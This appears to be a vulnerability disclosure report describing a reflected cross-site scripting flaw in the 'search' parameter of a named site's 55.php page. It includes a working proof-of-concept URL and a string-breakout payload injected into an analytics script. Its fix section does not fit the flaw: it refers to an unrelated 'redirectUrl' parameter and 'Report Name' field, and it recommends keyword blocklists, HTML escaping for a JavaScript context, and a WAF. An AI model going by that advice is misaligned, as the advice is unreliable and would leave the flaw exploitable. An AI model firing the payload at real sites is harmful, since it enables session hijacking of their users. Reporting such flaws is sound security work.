## Title

Reflected Cross-Site Scripting (XSS) via `search` Parameter


## Vulnerability Type

Reflected XSS


## Summary

The `search` parameter is reflected inside a JavaScript context without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

The issue occurs inside the analytics tracking script:

```javascript
internalSearchTerm: ""+alert("xicorr55.php")+"",
```


## Vulnerable Endpoint

```http
https://kzlabs.com/55.php
```

### Vulnerable Parameter

```http
search
```


## Steps to Reproduce

1. Open the following URL:

```http
https://kzlabs.com/55.php?search=%22%2Balert(%22xicorr55.php%22)%2B%22
```

2. Observe that a JavaScript alert executes on page load.


## Payload Used

```javascript
"+alert("xicorr55.php")+"
```


## Proof of Concept

The payload is reflected directly into the following JavaScript code:

```javascript
window.onload = function(e) {
    Analytics.trackEvent('searchReturned', {
        internalSearchTerm: ""+alert("xicorr55.php")+"",
        numOfSearchResultsReturned: 5
    });
}
```

### Screenshot — Alert Popup Triggered

![Alert Popup](./xss-screenshots/55-alert-popup.png)


## Impact

An attacker can perform the following actions using this vulnerability:

- It allows attackers to hijack user sessions.
- It potentially leads to full account takeover.
- It allows attackers to perform unauthorized actions within the vulnerable application.
- It allows attackers to exfiltrate sensitive data.

## Recommendations for Fix

Validate and sanitize the redirectUrl parameter to ensure that it does not contain any malicious content. This can be done by:

- Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
- Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
- If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
- Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
